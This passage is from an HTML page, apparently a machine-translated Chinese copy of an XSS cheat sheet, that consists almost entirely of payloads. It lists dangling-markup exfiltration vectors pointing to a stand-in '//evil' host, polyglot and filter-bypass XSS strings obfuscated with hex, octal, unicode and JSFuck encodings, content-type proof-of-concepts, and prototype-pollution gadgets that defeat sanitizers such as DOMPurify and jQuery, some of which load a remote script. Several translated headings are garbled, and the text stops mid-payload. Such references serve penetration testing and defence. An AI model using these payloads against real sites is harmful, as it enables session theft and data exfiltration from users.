+<pre class="language-javascript"><code>&lt;audio&gt;&lt;source src="//evil?</code></pre>
+<h4 id="input-src"><strong>输入src </strong></h4>
+<pre class="language-javascript"><code>&lt;input type=image src="//evil?</code></pre>
+<h4 id="button-using-formaction"><strong>按钮使用形式动作</strong></h4>
+<pre class="language-javascript"><code>&lt;form&gt;&lt;button style="width:100%;height:100%" type=submit formaction="//evil?</code></pre>
+<h4 id="input-using-formaction"><strong>使用格式动作输入</strong></h4>
+<pre class="language-javascript"><code>&lt;form&gt;&lt;input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?</code></pre>
+<h4 id="form-using-action"><strong>表单使用动作</strong></h4>
+<pre class="language-javascript"><code>&lt;button form=x style="width:100%;height:100%;"&gt;&lt;form id=x action="//evil?</code></pre>
+<h4 id="object-data"><strong>对象数据</strong></h4>
+<pre class="language-javascript"><code>&lt;object data="//evil?</code></pre>
+<h4 id="iframe-src"><strong> Iframe src </strong></h4>
+<pre class="language-javascript"><code>&lt;iframe src="//evil?</code></pre>
+<h4 id="embed-src"><strong>嵌入src </strong></h4>
+<pre class="language-javascript"><code>&lt;embed src="//evil?</code></pre>
+<h4 id="use-textarea-to-consume-markup-and-post-to-external-site"><strong>使用textarea消费标记并发布到外部站点</strong></h4>
+<pre class="language-javascript"><code>&lt;form&gt;&lt;button formaction=//evil&gt;XSS&lt;/button&gt;&lt;textarea name=x&gt;</code></pre>
+<h4 id="pass-markup-data-through-window-name-using-form-target"><strong>使用表单目标通过window.name传递标记数据</strong></h4>
+<pre class="language-javascript"><code>&lt;button form=x&gt;XSS&lt;/button&gt;&lt;form id=x action=//evil target='</code></pre>
+<h4 id="pass-markup-data-through-window-name-using-base-target"><strong>使用基本目标通过window.name传递标记数据</strong></h4>
+<pre class="language-javascript"><code>&lt;a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html&gt;&lt;font size=100 color=red&gt;You must click me&lt;/font&gt;&lt;/a&gt;&lt;base target="</code></pre>
+<h4 id="pass-markup-data-through-window-name-using-formtarget"><strong>使用formtarget通过window.name传递标记数据</strong></h4>
+<pre class="language-javascript"><code>&lt;form&gt;&lt;input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget="</code></pre>
+<h4 id="using-base-href-to-pass-data"><strong>使用基本href传递数据</strong></h4>
+<pre class="language-javascript"><code>&lt;a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;"&gt;xss&lt;base href="//evil/</code></pre>
+<h4 id="using-embed-window-name-to-pass-data-from-the-page"><strong>使用嵌入窗口名从页面传递数据</strong></h4>
+<pre class="language-javascript"><code>&lt;embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="</code></pre>
+<h4 id="using-iframe-window-name-to-pass-data-from-the-page"><strong>使用iframe窗口名从页面传递数据</strong></h4>
+<pre class="language-javascript"><code>&lt;iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="</code></pre>
+<h4 id="using-object-window-name-to-pass-data-from-the-page"><strong>使用对象窗口名从页面传递数据</strong></h4>
+<pre class="language-javascript"><code>&lt;object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="</code></pre>
+<h4 id="using-frame-window-name-to-pass-data-from-the-page"><strong>使用框架窗口名称从页面传递数据</strong></h4>
+<pre class="language-javascript"><code>&lt;frameset&gt;&lt;frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="</code></pre>
+<h4 id="overwrite-type-attribute-with-image-in-hidden-inputs"><strong>用隐藏输入中的图像覆盖类型属性</strong></h4>
+<pre class="language-javascript"><code>&lt;input type=hidden type=image src="//evil?</code></pre>
+<h3 id="polyglots"><strong>多语言者</strong></h3>
+<h4 id="polyglot-payload-1"><strong>多语言有效载荷1 </strong></h4>
+<pre class="language-javascript"><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;</code></pre>
+<h4 id="polyglot-payload-2"><strong>多语言有效载荷2 </strong></h4>
+<pre class="language-javascript"><code>javascript:"/*'/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \" onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;</code></pre>
+<h4 id="polyglot-payload-3"><strong>多语言有效载荷3 </strong></h4>
+<pre class="language-javascript"><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'&gt;</code></pre>
+<h3 id="waf-bypass-global-objects"><strong>晶圆绕过全局对象</strong></h3>
+<h4 id="xss-into-a-javascript-string-string-concatenation-window"><strong> XSS成JavaScript字符串:字符串串联(窗口)</strong></h4>
+<pre class="language-javascript"><code>';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-string-concatenation-self"><strong> XSS成JavaScript字符串:字符串串联(self) </strong></h4>
+<pre class="language-javascript"><code>';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-string-concatenation-this"><strong> XSS成JavaScript字符串:字符串串联(this) </strong></h4>
+<pre class="language-javascript"><code>';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-string-concatenation-top"><strong> XSS成JavaScript字符串:字符串串联(上)</strong></h4>
+<pre class="language-javascript"><code>';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-string-concatenation-parent"><strong> XSS成JavaScript字符串:字符串串联(父级)</strong></h4>
+<pre class="language-javascript"><code>';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-string-concatenation-frames"><strong> XSS成JavaScript字符串:字符串串联(帧)</strong></h4>
+<pre class="language-javascript"><code>';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-string-concatenation-globalthis"><strong> XSS成JavaScript字符串:字符串串联(globalThis) </strong></h4>
+<pre class="language-javascript"><code>';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//</code></pre>
+
+<pre class="language-javascript"><code>';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//</code></pre>
+
+<pre class="language-javascript"><code>';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//</code></pre>
+
+<pre class="language-javascript"><code>';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//</code></pre>
+
+<pre class="language-javascript"><code>';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//</code></pre>
+
+<pre class="language-javascript"><code>';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//</code></pre>
+
+<pre class="language-javascript"><code>';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//</code></pre>
+
+<pre class="language-javascript"><code>';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-window"><strong> XSS转换成JavaScript字符串:十六进制转义序列(窗口)</strong></h4>
+<pre class="language-javascript"><code>';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-self"><strong> XSS转换成JavaScript字符串:十六进制转义序列(self) </strong></h4>
+<pre class="language-javascript"><code>';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-this"><strong> XSS转换成JavaScript字符串:十六进制转义序列(this) </strong></h4>
+<pre class="language-javascript"><code>';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-top"><strong> XSS转换成JavaScript字符串:十六进制转义序列(上)</strong></h4>
+<pre class="language-javascript"><code>';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-parent"><strong> XSS转换成JavaScript字符串:十六进制转义序列(父序列)</strong></h4>
+<pre class="language-javascript"><code>';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-frames"><strong> XSS转换成JavaScript字符串:十六进制转义序列(帧)</strong></h4>
+<pre class="language-javascript"><code>';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-globalthis"><strong> XSS转换成JavaScript字符串:十六进制转义序列(globalThis) </strong></h4>
+<pre class="language-javascript"><code>';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-window"><strong> XSS成JavaScript字符串:十六进制转义序列和base64编码字符串(window) </strong></h4>
+<pre class="language-javascript"><code>';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-self"><strong> XSS成JavaScript字符串:十六进制转义序列和base64编码字符串(self) </strong></h4>
+<pre class="language-javascript"><code>';self['\x65\x76\x61\x6c']('self["\x61\x6c\x65\x72\x74"](self["\x61\x74\x6f\x62"]("WFNT"))');//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-this"><strong> XSS成JavaScript字符串:十六进制转义序列和base64编码字符串(this) </strong></h4>
+<pre class="language-javascript"><code>';this['\x65\x76\x61\x6c']('this["\x61\x6c\x65\x72\x74"](this["\x61\x74\x6f\x62"]("WFNT"))');//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-top"><strong> XSS成JavaScript字符串:十六进制转义序列和base64编码字符串(上)</strong></h4>
+<pre class="language-javascript"><code>';top['\x65\x76\x61\x6c']('top["\x61\x6c\x65\x72\x74"](top["\x61\x74\x6f\x62"]("WFNT"))');//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-parent"><strong> XSS成JavaScript字符串:十六进制转义序列和base64编码字符串(父级)</strong></h4>
+<pre class="language-javascript"><code>';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-frames"><strong> XSS成JavaScript字符串:十六进制转义序列和base64编码字符串(帧)</strong></h4>
+<pre class="language-javascript"><code>';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');//</code></pre>
+<h4 id="xss-into-a-javascript-string-hex-escape-sequence-and-base64-encoded-string-globalthis"><strong> XSS成JavaScript字符串:十六进制转义序列和base64编码字符串(globalThis) </strong></h4>
+<pre class="language-javascript"><code>';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');//</code></pre>
+<h4 id="xss-into-a-javascript-string-octal-escape-sequence-window"><strong> XSS转换成JavaScript字符串:八进制转义序列(窗口)</strong></h4>
+<pre class="language-javascript"><code>';window['\141\154\145\162\164']('\130\123\123');//</code></pre>
+<h4 id="xss-into-a-javascript-string-octal-escape-sequence-self"><strong> XSS转换成JavaScript字符串:八进制转义序列(self) </strong></h4>
+<pre class="language-javascript"><code>';self['\141\154\145\162\164']('\130\123\123');//</code></pre>
+<h4 id="xss-into-a-javascript-string-octal-escape-sequence-this"><strong> XSS转换成JavaScript字符串:八进制转义序列(this) </strong></h4>
+<pre class="language-javascript"><code>';this['\141\154\145\162\164']('\130\123\123');//</code></pre>
+<h4 id="xss-into-a-javascript-string-octal-escape-sequence-top"><strong> XSS转换成JavaScript字符串:八进制转义序列(上)</strong></h4>
+<pre class="language-javascript"><code>';top['\141\154\145\162\164']('\130\123\123');//</code></pre>
+<h4 id="xss-into-a-javascript-string-octal-escape-sequence-parent"><strong> XSS转换成JavaScript字符串:八进制转义序列(父序列)</strong></h4>
+<pre class="language-javascript"><code>';parent['\141\154\145\162\164']('\130\123\123');//</code></pre>
+<h4 id="xss-into-a-javascript-string-octal-escape-sequence-frames"><strong> XSS转换成JavaScript字符串:八进制转义序列(帧)</strong></h4>
+<pre class="language-javascript"><code>';frames['\141\154\145\162\164']('\130\123\123');//</code></pre>
+<h4 id="xss-into-a-javascript-string-octal-escape-sequence-globalthis"><strong> XSS转换成JavaScript字符串:八进制转义序列(globalThis) </strong></h4>
+<pre class="language-javascript"><code>';globalThis['\141\154\145\162\164']('\130\123\123');//</code></pre>
+<h4 id="xss-into-a-javascript-string-unicode-escape-window"><strong> XSS转换成JavaScript字符串:unicode escape (window) </strong></h4>
+<pre class="language-javascript"><code>';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//</code></pre>
+<h4 id="xss-into-a-javascript-string-unicode-escape-self"><strong> XSS转换成JavaScript字符串:unicode escape (self) </strong></h4>
+<pre class="language-javascript"><code>';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//</code></pre>
+<h4 id="xss-into-a-javascript-string-unicode-escape-this"><strong> XSS转换成JavaScript字符串:unicode转义(this) </strong></h4>
+<pre class="language-javascript"><code>';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//</code></pre>
+<h4 id="xss-into-a-javascript-string-unicode-escape-top"><strong> XSS转换成JavaScript字符串:unicode转义(上)</strong></h4>
+<pre class="language-javascript"><code>';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//</code></pre>
+<h4 id="xss-into-a-javascript-string-unicode-escape-parent"><strong> XSS转换成JavaScript字符串:unicode escape (parent) </strong></h4>
+<pre class="language-javascript"><code>';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//</code></pre>
+<h4 id="xss-into-a-javascript-string-unicode-escape-frames"><strong> XSS转换成JavaScript字符串:unicode转义(帧)</strong></h4>
+<pre class="language-javascript"><code>';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//</code></pre>
+<h4 id="xss-into-a-javascript-string-unicode-escape-globalthis"><strong> XSS转换成JavaScript字符串:unicode escape (globalThis) </strong></h4>
+<pre class="language-javascript"><code>';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//</code></pre>
+<h4 id="xss-into-a-javascript-string-regexp-source-property-window"><strong> XSS转换成JavaScript字符串:RegExp source属性(窗口)</strong></h4>
+<pre class="language-javascript"><code>';window[/al/.source+/ert/.source](/XSS/.source);//</code></pre>
+<h4 id="xss-into-a-javascript-string-regexp-source-property-self"><strong> XSS转换成JavaScript字符串:RegExp source property (self) </strong></h4>
+<pre class="language-javascript"><code>';self[/al/.source+/ert/.source](/XSS/.source);//</code></pre>
+<h4 id="xss-into-a-javascript-string-regexp-source-property-this"><strong> XSS转换成JavaScript字符串:RegExp source property (this) </strong></h4>
+<pre class="language-javascript"><code>';this[/al/.source+/ert/.source](/XSS/.source);//</code></pre>
+<h4 id="xss-into-a-javascript-string-regexp-source-property-top"><strong> XSS转换成JavaScript字符串:RegExp source property (top) </strong></h4>
+<pre class="language-javascript"><code>';top[/al/.source+/ert/.source](/XSS/.source);//</code></pre>
+<h4 id="xss-into-a-javascript-string-regexp-source-property-parent"><strong> XSS成JavaScript字符串:RegExp source property(parent)</strong></h4>
+<pre class="language-javascript"><code>';parent[/al/.source+/ert/.source](/XSS/.source);//</code></pre>
+<h4 id="xss-into-a-javascript-string-regexp-source-property-frames"><strong> XSS转换成JavaScript字符串:RegExp source property(frames)</strong></h4>
+<pre class="language-javascript"><code>';frames[/al/.source+/ert/.source](/XSS/.source);//</code></pre>
+<h4 id="xss-into-a-javascript-string-regexp-source-property-globalthis"><strong> XSS转换成JavaScript字符串:RegExp source property(global this)</strong></h4>
+<pre class="language-javascript"><code>';globalThis[/al/.source+/ert/.source](/XSS/.source);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hieroglyphy-jsfuck-window"><strong> XSS转换成JavaScript字符串:Hieroglyphy/JSFuck (window) </strong></h4>
+<pre class="language-javascript"><code>';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hieroglyphy-jsfuck-self"><strong> XSS转换成JavaScript字符串:Hieroglyphy/JSFuck (self) </strong></h4>
+<pre class="language-javascript"><code>';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hieroglyphy-jsfuck-this"><strong> XSS转换成JavaScript字符串:Hieroglyphy/JSFuck (this) </strong></h4>
+<pre class="language-javascript"><code>';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hieroglyphy-jsfuck-top"><strong> XSS转换成JavaScript字符串:Hieroglyphy/JSFuck (top) </strong></h4>
+<pre class="language-javascript"><code>';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hieroglyphy-jsfuck-parent"><strong> XSS转换成JavaScript字符串:Hieroglyphy/JSFuck (parent) </strong></h4>
+<pre class="language-javascript"><code>';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hieroglyphy-jsfuck-frames"><strong> XSS转换成JavaScript字符串:Hieroglyphy/JSFuck (frames) </strong></h4>
+<pre class="language-javascript"><code>';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//</code></pre>
+<h4 id="xss-into-a-javascript-string-hieroglyphy-jsfuck-globalthis"><strong> XSS转换成JavaScript字符串:Hieroglyphy/js fuck(global this)</strong></h4>
+<pre class="language-javascript"><code>';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//</code></pre>
+<h2 id="content-type"><strong>内容类型</strong></h2>
+<p>我们的XSS备忘单的这一部分列出了可用于XSS的内容类型，其中X-Content-Type-Options: nosniff标题及其POC处于活动状态。</p>
+<h4 id="text-html"><strong>文本/html </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre>
+<h4 id="application-xhtml-xml"><strong>应用/xhtml+xml </strong></h4>
+<pre class="language-javascript"><code>&lt;x : script xmlns : x="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/x:script&gt;</code></pre>
+<h4 id="application-xml"><strong>应用程序/xml </strong></h4>
+<pre class="language-javascript"><code>&lt;x : script xmlns : x="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/x:script&gt;</code></pre>
+<h4 id="text-xml"><strong>文本/xml </strong></h4>
+<pre class="language-javascript"><code>&lt;x : script xmlns : x="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/x:script&gt;</code></pre>
+<h4 id="image-svg-xml"><strong> image/svg+xml </strong></h4>
+<pre class="language-javascript"><code>&lt;x : script xmlns : x="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/x:script&gt;</code></pre>
+<h4 id="text-xsl"><strong>文字/xsl </strong></h4>
+<pre class="language-javascript"><code>&lt;x : script xmlns : x="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/x:script&gt;</code></pre>
+<h4 id="application-vnd-wap-xhtml-xml"><strong>application/vnd . WAP . XHTML+XML</strong></h4>
+<pre class="language-javascript"><code>&lt;x : script xmlns : x="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/x:script&gt;</code></pre>
+<h4 id="text-rdf"><strong> text/rdf </strong></h4>
+<pre class="language-javascript"><code>&lt;x : script xmlns : x="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/x:script&gt;</code></pre>
+<h4 id="application-rdf-xml"><strong>应用程序/rdf+xml </strong></h4>
+<pre class="language-javascript"><code>&lt;x : script xmlns : x="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/x:script&gt;</code></pre>
+<h4 id="application-mathml-xml"><strong>应用程序/mathml+xml </strong></h4>
+<pre class="language-javascript"><code>&lt;x : script xmlns : x="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/x:script&gt;</code></pre>
+<h4 id="text-vtt"><strong> text/vtt </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre>
+<h4 id="text-cache-manifest"><strong>文本/缓存清单</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre>
+<h3 id="prototype-pollution"><strong>原型污染</strong></h3>
+<p>下一节将介绍不同的原型污染攻击，以及它们的XSS有效载荷。</p>
+<h4 id="wistia-embedded-video"><strong> Wistia嵌入式视频</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.innerHTML = '&lt;img/src/onerror=alert(1)&gt;';
+
+&lt;/script&gt;</code></pre>
+<h4 id="x-off-jquery"><strong> $(x)。关闭jQuery </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.preventDefault='x';
+
+Object.prototype.handleObj='x';
+
+Object.prototype.delegateTarget='&lt;img/src/onerror=alert(1)&gt;';
+
+/* No extra code needed for jQuery 1 &amp; 2 */$(document).off('foobar');
+
+&lt;/script&gt;</code></pre>
+<h4 id="html-jquery"><strong> $(html) jQuery </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.div=['1','&lt;img src onerror=alert(1)&gt;','1']
+
+&lt;/script&gt;&lt;script&gt;
+
+$('&lt;div x="x"&gt;&lt;/div&gt;')
+
+&lt;/script&gt;</code></pre>
+<h4 id="get-jquery"><strong> $。获取jQuery </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.url = ['data:,alert(1)//'];
+
+Object.prototype.dataType = 'script';
+
+&lt;/script&gt;
+
+&lt;script&gt;
+
+$.get('https://google.com/');
+
+$.post('https://google.com/');
+
+&lt;/script&gt;</code></pre>
+<h4 id="getscript-jquery"><strong>美元。getScript jQuery </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.src = ['data:,alert(1)//']
+
+&lt;/script&gt;
+
+&lt;script&gt;
+
+$.getScript('https://google.com/')
+
+&lt;/script&gt;</code></pre>
+<h4 id="getscript-jquery-1"><strong>美元。getScript jQuery </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.url = 'data:,alert(1)//'
+
+&lt;/script&gt;
+
+&lt;script&gt;
+
+$.getScript('https://google.com/')
+
+&lt;/script&gt;</code></pre>
+<h4 id="google-recaptcha"><strong>谷歌reCAPTCHA </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.srcdoc=['&lt;script&gt;alert(1)&lt;\/script&gt;']
+
+&lt;/script&gt;
+
+&lt;div class="g-recaptcha" data-sitekey="your-site-key"/&gt;</code></pre>
+
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.hif = ['javascript:alert(document.domain)'];
+
+&lt;/script&gt;</code></pre>
+<h4 id="tealium-universal-tag"><strong> Tealium通用标签</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.attrs = {src:1};
+
+Object.prototype.src='https://portswigger-labs.net/xss/xss.js'
+
+&lt;/script&gt;</code></pre>
+<h4 id="akamai-boomerang"><strong>阿卡迈飞镖</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;Object.prototype.BOOMR = 1;
+
+Object.prototype.url='https://portswigger-labs.net/xss/xss.js'&lt;/script&gt;</code></pre>
+<h4 id="lodash"><strong>洛达什</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.sourceURL = '\u2028\u2029alert(1)'
+
+&lt;/script&gt;
+
+&lt;script&gt;
+
+_.template('test')
+
+&lt;/script&gt;</code></pre>
+<h4 id="sanitize-html"><strong> sanitize-html </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype['*'] = ['onload']&lt;/script&gt;
+
+&lt;script&gt;
+
+document.write(sanitizeHtml('&lt;iframe onload=alert(1)&gt;'))
+
+&lt;/script&gt;</code></pre>
+<h4 id="js-xss"><strong> js-xss </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.whiteList = {img: ['onerror', 'src']}
+
+&lt;/script&gt;
+
+&lt;script&gt;
+
+document.write(filterXSS('&lt;img src onerror=alert(1)&gt;'))
+
+&lt;/script&gt;</code></pre>
+<h4 id="dompurify">驯化</h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.ALLOWED_ATTR = ['onerror', 'src']
+
+&lt;/script&gt;
+
+&lt;script&gt;
+
+document.write(DOMPurify.sanitize('&lt;img src onerror=alert(1)&gt;'))
+
+&lt;/script&gt;</code></pre>
+<h4 id="dompurify-1">驯化</h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.documentMode = 9
+
+&lt;/script&gt;</code></pre>
+<h4 id="closure"><strong>关闭</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+const html = '&lt;img src onerror=alert(1)&gt;';
+
+const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
+
+const sanitized = sanitizer.sanitize(html);
+
+const node = goog.dom.safeHtmlToNode(sanitized);
+
+document.body.append(node);
+
+&lt;/script&gt;</code></pre>
+<h4 id="closure-1"><strong>关闭</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';
+
+&lt;/script&gt;</code></pre>
+<h4 id="marionette-js-backbone-js"><strong>牵线木偶. js / Backbone.js </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.tagName = 'img'
+
+Object.prototype.src = ['x:x']
+
+Object.prototype.onerror = ['alert(1)']
+
+&lt;/script&gt;
+
+&lt;script&gt;
+
+(function() {
+
+var View = Mn.View.extend({template: '#template-layout'});
+
+var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}});
+
+var app = new App();
+
+app.start();
+
+})();
+
+&lt;/script&gt;
+
+&lt;div id="template-layout" type="x-template/underscore"&gt;xxx&lt;/div&gt;</code></pre>
+<h4 id="adobe-dynamic-tag-management"><strong> Adobe动态标签管理</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.src='data:,alert(1)//'
+
+&lt;/script&gt;</code></pre>
+<h4 id="embedly-cards"><strong>嵌入式卡</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.onload = 'alert(1)'
+
+&lt;/script&gt;</code></pre>
+<p>细分分析. js</p>
+<pre class="language-javascript"><code>&lt;script&gt;
+
+Object.prototype.script = [1,'&lt;img/src/onerror=alert(1)&gt;','&lt;img/src/onerror=alert(2)&gt;']
+
+&lt;/script&gt;</code></pre>
+<h4 id="knockout-js"><strong> Knockout.js </strong></h4>
+<pre class="language-javascript"><code>&lt;strong data-bind="text:'hello'"&gt;&lt;/strong&gt;
+
+&lt;script&gt;
+
+Object.prototype[4]="a':1,[alert(1)]:1,'b";Object.prototype[5]=',';
+
